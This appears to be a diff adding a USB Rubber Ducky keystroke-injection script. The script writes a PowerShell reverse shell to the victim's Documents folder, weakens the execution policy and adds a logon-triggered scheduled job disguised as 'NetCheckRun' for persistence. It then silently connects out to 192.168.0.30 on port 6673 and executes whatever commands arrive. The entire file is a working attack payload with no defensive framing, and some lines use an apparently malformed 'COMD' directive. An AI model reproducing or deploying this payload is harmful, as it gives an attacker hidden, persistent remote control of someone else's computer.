@@ -1,0 +1,110 @@
+REM open notepad and write the PS code to 'psAuxL.ps1'
+MAP UK
+DELAY 1500
+GUI
+DELAY 1000
+STRING notepad.exe
+ENTER
+DELAY 2000
+STRING param([String]$dest, [Int32]$port);
+ENTER
+DELAY 50
+STRING while (1 -eq 1) {  $ErrorActionPreference = 'Continue';
+ENTER
+DELAY 50
+STRING  try {$client = New-Object System.Net.Sockets.TCPClient($dest,$port);
+ENTER
+STRING $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
+ENTER
+STRING  $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
+ENTER
+STRING $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush();
+ENTER
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+ENTER
+STRING  $recdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+ENTER
+STRING  if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;} try {
+ENTER
+STRING  $sendback = (iex $recdata 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";}
+ENTER
+STRING  catch { $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
+ENTER
+STRING  $sendback2  =  "ERROR: " + $error[0].ToString() + "`n`n" + "PS " + (pwd).Path + "> "; cls;}
+ENTER
+COMD  $returnbytes = ([text.encoding]::ASCII).GetBytes($sendback2);
+COMD  $stream.Write($returnbytes,0,$returnbytes.Length);$stream.Flush(); } }
+COMD  catch { if($client.Connected) { $client.Close(); }
+COMD  cls; Start-Sleep -s 30; } }
+REM save the file
+ALT
+DELAY 200
+STRING f
+DELAY 200
+STRING a
+DELAY 300
+STRING My Documents\psAuxL.ps1
+ENTER
+DELAY 2000
+ALT
+DELAY 250
+STRING f
+DELAY 200
+STRING x
+DELAY 500
+REM open powershell and set the execution policy
+GUI
+DELAY 1500
+STRING powershell.exe
+DELAY 800
+MENU
+DELAY 500
+STRING a
+ENTER
+DELAY 1200
+ALT + Y
+DELAY 250
+ENTER
+DELAY 3000
+REM first lets set the execution policy if possible
+STRING Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+DELAY 50
+ENTER
+DELAY 750
+STRING Y
+DELAY 250
+ENTER
+DELAY 200
+STRING $dirx = "C:\Users\" + [Environment]::UserName + "\Documents";
+DELAY 70
+ENTER
+DELAY 50
+STRING $fullpath = $dirx + "\psAuxL.ps1";
+DELAY 70
+ENTER
+REM finally - attempt to make the shell survive a reboot
+STRING $jobtrigger = New-JobTrigger -AtLogon -RandomDelay 00:00:50
+DELAY 50
+ENTER
+DELAY 400
+STRING Register-ScheduledJob -Trigger $jobtrigger -Scriptblock{cd $dirx; ./psAuxL.ps1 -dest 192.168.0.30 -port 6673}  -Name "NetCheckRun"
+DELAY 50
+ENTER
+DELAY 1200
+STRING cd $dirx;
+ENTER
+DELAY 200
+STRING powershell.exe -windowstyle hidden {./psAuxL.ps1 -dest 192.168.0.30 -port 6673}
+DELAY 100
+ENTER
+DELAY 200
+STRING exit
+ENTER 
+
+
+
+
+
+
+
+
